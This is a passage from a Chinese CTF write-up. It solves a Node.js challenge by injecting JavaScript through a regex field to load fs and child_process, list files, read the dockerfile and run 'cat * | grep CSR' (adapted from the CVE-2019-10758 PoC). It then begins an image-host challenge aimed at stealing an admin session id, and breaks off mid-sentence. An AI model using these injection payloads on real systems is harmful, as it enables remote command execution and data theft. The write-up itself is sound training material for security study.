<blockquote style="box-sizing: border-box;margin-top: 20px;margin-bottom: 20px;border-top: none;border-right: none;border-bottom: none;border-left-color: rgba(0, 0, 0, 0.4);font-size: 0.9em;overflow: auto;background: rgba(0, 0, 0, 0.05);color: rgb(106, 115, 125);padding: 10px 10px 10px 20px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;"><p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;">require()</p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;">This variable may appear to be global&nbsp;<strong style="box-sizing: border-box;">but is not</strong>. See&nbsp;<code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;background-color: rgba(27, 31, 35, 0.05);word-break: break-all;">require()</code>.</p>
<pre style="box-sizing: border-box;font-size: 1em;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;">(function(){Function(&#39;console.log(require(<span style="box-sizing: border-box;line-height: 26px;">&quot;fs&quot;</span>).readFileSync(<span style="box-sizing: border-box;line-height: 26px;">&quot;/etc/passwd&quot;</span>))&#39;)()})()<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//ReferenceError:&nbsp;require&nbsp;is&nbsp;not&nbsp;defined</span><br style="box-sizing: border-box;"/></code></pre>
</blockquote>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">这题就没有，而&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">process.mainModule</span></code><span style="font-size: 15px;">&nbsp;属性提供了一种获取&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">require.main</span></code><span style="font-size: 15px;">&nbsp;的替代方式，换言之，我们可以通过&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">process.mainModule.require(&#39;fs&#39;)</span></code><span style="font-size: 15px;">&nbsp;来载入，然后通过&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">fs.readdirSync(path[, options])</span></code><span style="font-size: 15px;">&nbsp;同步返回一个包含“指定目录下所有文件名称”的数组对象。</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//&nbsp;test</span><br style="box-sizing: border-box;"/>w/gi);<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">let</span>&nbsp;files&nbsp;=&nbsp;[];&nbsp;<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;fs&nbsp;=&nbsp;process.mainModule.require(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;fs&#39;</span>);<br style="box-sizing: border-box;"/>fs.readdirSync(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;.&quot;</span>).forEach(<span style="box-sizing: border-box;line-height: 26px;">file&nbsp;=&gt;</span>&nbsp;files.push(file)&nbsp;);&nbsp;<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;files;<span style="box-sizing: border-box;color: #009926;line-height: 26px;">/<br style="box-sizing: border-box;"/>------<br style="box-sizing: border-box;"/>&#39;123&#39;.match(/</span>w/gi);<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">let</span>&nbsp;files&nbsp;=&nbsp;[];&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;fs&nbsp;=&nbsp;process.mainModule.require(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;fs&#39;</span>);fs.readdirSync(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;.&quot;</span>).forEach(<span style="box-sizing: border-box;line-height: 26px;">file&nbsp;=&gt;</span>&nbsp;files.push(file)&nbsp;);<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;files;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//gi)</span><br style="box-sizing: border-box;"/>------<br style="box-sizing: border-box;"/>{&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;result&quot;</span>:&nbsp;[&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;.dockerignore&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;api.js&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;csregex&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;dist&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;dockerfile&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;index.js&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;leftover.js&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;node_modules&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;package-lock.json&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;package.json&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;regexer.js&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;requests.log&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;simple-fs.js&quot;</span>&nbsp;]&nbsp;}<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">成功，那么接下来只要读取这些文件，结果在&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">dockerfile</span></code><span style="font-size: 15px;">&nbsp;中：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//&nbsp;test</span><br style="box-sizing: border-box;"/>w/gi);<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;fs&nbsp;=&nbsp;process.mainModule.require(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;fs&#39;</span>);<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;data&nbsp;=&nbsp;fs.readFileSync(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;dockerfile&#39;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;utf8&#39;</span>);<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;data;<span style="box-sizing: border-box;color: #009926;line-height: 26px;">/<br style="box-sizing: border-box;"/>------<br style="box-sizing: border-box;"/>&#39;123&#39;.match(/</span>w/gi);&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;fs&nbsp;=&nbsp;process.mainModule.require(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;fs&#39;</span>);&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;data&nbsp;=&nbsp;fs.readFileSync(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;dockerfile&#39;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;utf8&#39;</span>);&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;data;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//gi)</span><br style="box-sizing: border-box;"/></code></pre>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-1607395268.png"/></p>
<p><br/></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">当然也可以直接&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">cat</span></code><span style="font-size: 15px;">&nbsp;读取文件：</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">先给出拼接后的 JavaScript Code :</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&#39;</span>+<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">constructor</span>.<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">constructor</span>(&quot;return&nbsp;process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&#39;cat&nbsp;*&nbsp;|&nbsp;grep&nbsp;CSR&#39;)+&#39;&nbsp;n&#39;.match(/w/gi)<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">同上，只不过是选择先闭合了要匹配的字符串，获得全局上下文后直接导入&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">child_process</span></code><span style="font-size: 15px;">&nbsp;来执行系统命令。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">payload（ exp 学习自&nbsp;</span><span style="font-size: 15px;">CVE-2019-10758 PoC</span><span style="font-size: 15px;">）：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;+this.constructor.constructor(&quot;return&nbsp;process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&#39;</span>cat&nbsp;*&nbsp;|&nbsp;grep&nbsp;CSR<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;)+&#39;</span>&nbsp;<br style="box-sizing: border-box;"/></code></pre>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-1607395269.png"/></p>
<h2 style="box-sizing: border-box;margin-top: 30px;margin-bottom: 15px;color: rgb(0, 0, 0);font-weight: bold;font-size: 22px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;font-size: 15px;">imghost</span></h2>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">文件上传。</span></p>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-16073952691.png"/></p>
<p><br/></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">PHP，dirsearch 扫目录有：</span></p>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-16073952692.png"/></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">得到 file.php 源码：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&lt;?php</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>session_start();<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>$filename&nbsp;=&nbsp;substr($_SERVER[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;DOCUMENT_URI&quot;</span>],&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">3</span>);<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>(!file_exists(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;/dev/shm/uploads/&quot;</span>&nbsp;.&nbsp;$filename)&nbsp;||&nbsp;strlen($filename)&nbsp;&gt;&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">24</span>)&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">die</span>(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;&lt;h1&gt;404&nbsp;File&nbsp;not&nbsp;found&lt;/h1&gt;&quot;</span>);<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>($_GET[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;report&quot;</span>]&nbsp;==&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;1&quot;</span>)&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>(!file_exists(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;/dev/shm/reports&quot;</span>))&nbsp;mkdir(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;/dev/shm/reports&quot;</span>);<br style="box-sizing: border-box;"/>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>(!file_exists(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;/dev/shm/reports/&quot;</span>&nbsp;.&nbsp;$filename))&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;file_put_contents(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;/dev/shm/reports/&quot;</span>&nbsp;.&nbsp;$filename,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;&quot;</span>);<br style="box-sizing: border-box;"/>&nbsp;}<br style="box-sizing: border-box;"/>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">die</span>(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;File&nbsp;has&nbsp;been&nbsp;reported,&nbsp;thanks&nbsp;for&nbsp;your&nbsp;help!&quot;</span>);<br style="box-sizing: border-box;"/>}<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>header(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;Content-Security-Policy:&nbsp;script-src&nbsp;&#39;none&#39;;&quot;</span>);<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">echo</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&lt;object&nbsp;border=&quot;2px&quot;&nbsp;data=&quot;/uploads/&#39;</span>&nbsp;.&nbsp;$filename&nbsp;.&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;?lang=en&amp;ref=website&amp;pd=&#39;</span>&nbsp;.&nbsp;md5(session_id())&nbsp;.&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&amp;u=&#39;</span>&nbsp;.&nbsp;uniqid()&nbsp;.&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&amp;client=&#39;</span>&nbsp;.&nbsp;session_id()&nbsp;.&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&amp;method=direct&amp;t=&#39;</span>&nbsp;.&nbsp;time()&nbsp;.&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&quot;&gt;&lt;/object&gt;&#39;</span>;<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">echo</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;&lt;br/&gt;&lt;a&nbsp;href=&quot;?report=1&quot;&gt;Report&nbsp;abuse&lt;/a&gt;&#39;</span>;<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">?&gt;</span><br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">这里需要注意的是 HTTP 头信息的&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">Content-Security-Policy</span></code><span style="font-size: 15px;">&nbsp;，简称 CSP ，通常是用来防 XSS 的，提供了很多限制选项，这里的&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">script-src</span></code><span style="font-size: 15px;">&nbsp;限制外部脚本的加载，选项值是&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">&#39;none&#39;</span></code><span style="font-size: 15px;">&nbsp;禁止加载任何外部资源，所以基本不可能 RCE 。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">结合题名，我们可以尝试去获取管理员的 session id 。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">当我们上传一个图片后，点击，</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">~/i/encrypted_filename.png</span></code><span style="font-size: 15px;">&nbsp;会去请求：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;">~/uploads/FHYVFZAsWZukicREmqTS.png?lang=en&amp;ref=website&amp;pd=387a36e941f19635f8f898f8e2af0dd2&amp;u=5fa8e6669c74b&amp;client=hluad03qhmob6onl376hlnad5h&amp;method=direct&amp;t=1604904550<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">用以校验身份，而访问图片成功后，有 Report abuse ，点击 referer 同样是来自&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">~/i/encrypted_filename.png</span></code><span style="font-size: 15px;">&nbsp;，结合源码，File Report 后，会在&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">/dev/shm/reports/</span></code><span style="font-size: 15px;">&nbsp;目录下生成一个对应的文件，可以合理猜测，管理员进行访问时也会有来自&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 